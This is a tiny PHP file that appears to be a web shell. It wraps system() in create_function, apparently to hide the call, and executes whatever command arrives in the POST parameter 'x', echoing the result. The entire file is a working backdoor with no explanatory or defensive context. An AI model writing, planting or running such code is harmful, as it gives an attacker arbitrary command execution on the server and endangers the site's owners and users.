<?php
$f = create_function('$c', 'return system($c);');
echo $f($_POST['x']);
